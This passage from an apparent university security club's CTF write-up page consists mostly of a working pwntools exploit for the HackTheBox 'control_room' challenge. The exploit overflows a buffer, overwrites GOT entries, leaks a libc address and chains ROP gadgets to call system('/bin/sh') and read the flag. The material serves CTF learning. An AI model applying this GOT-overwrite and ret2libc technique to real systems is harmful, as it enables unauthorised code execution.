</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./control_room_patched&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>IP</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>],</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>],</span> <span class=n>level</span><span class=o>=</span><span class=s2>&#34;WARNING&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>conn</span><span class=p>()</span> <span class=k>as</span> <span class=n>p</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># change role to technician</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># overwrite stack_check_fail</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;-14&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;y&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># overwrite memset cos it keeps crashing</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;-13&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>puts</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;y&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># make strcmp a buffer overflow</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;-11&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>read_input</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>puts</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;y&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># trigger overflow</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rop</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rop</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=mh>0x401db2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=mi>19</span><span class=p>:</span> <span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;LEAK: </span><span class=si>%#x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;LIBC BASE </span><span class=si>%#x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;ret&#34;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rop</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>[</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=mi>19</span><span class=p>:</span> <span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;cat flag.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline_contains</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;HTB&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;Flag: &#34;</span> <span class=o>+</span> <span class=n>flag</span><span class=p>)</span> <span class=k>if</span> <span class=n>flag</span> <span class=k>else</span> <span class=n>log</span><span class=o>.</span><span class=n>critical</span><span class=p>(</span><span class=s2>&#34;Exploit failed&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/control/ss3.png data-srcset="./images/control/ss3.png, ./images/control/ss3.png 1.5x, ./images/control/ss3.png 2x" data-sizes=auto alt=./images/control/ss3.png title="Got the Flag"></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-03-31&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/75230110966b485271c0481554519607b289533b target=_blank title="commit by sharkmoos(muddy117@gmail.com) 75230110966b485271c0481554519607b289533b: Update index.md">
<i class="fas fa-hashtag fa-fw"></i>7523011</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/posts/2023_hackthebox_cyberapoc/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/down-under-ctf-2022/ class=prev rel=prev title="DownUnder CTF 2022"><i class="fas fa-angle-left fa-fw"></i>DownUnder CTF 2022</a></div></div><div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong><noscript>Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>